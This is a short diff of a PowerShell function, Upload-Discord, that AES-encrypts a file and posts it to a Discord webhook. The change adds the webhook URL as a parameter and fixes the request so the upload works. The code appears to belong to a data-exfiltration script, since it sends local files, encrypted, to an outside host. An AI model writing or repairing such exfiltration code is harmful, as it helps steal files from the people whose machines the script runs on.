@@ -497,14 +497,15 @@ function Upload-Discord {
         [parameter(Position=0, Mandatory=$True)]
         [string]$file,  # File to encrypt and send
         
+        [parameter(Position=1, Mandatory=$True)]
+        [string]$dc,  # Discord webhook URL
+        
         [parameter(Position=2, Mandatory=$True)]
         [string]$keyBase64,  # AES Key in Base64 format
         
         [parameter(Position=3, Mandatory=$True)]
         [string]$ivBase64  # AES IV in Base64 format
     )
-
-    $hookurl = "$dc"
 
     # Convert the Base64 key and IV into byte arrays
     $key = [System.Convert]::FromBase64String($keyBase64)
@@ -538,7 +539,7 @@ function Upload-Discord {
         # Upload the encrypted file to Discord
         try {
             $fileParams = @{
-                $hookurl
+                Uri = $dc
                 Method = 'Post'
                 Form = @{
                     'file' = Get-Item -Path $encryptedFilePath
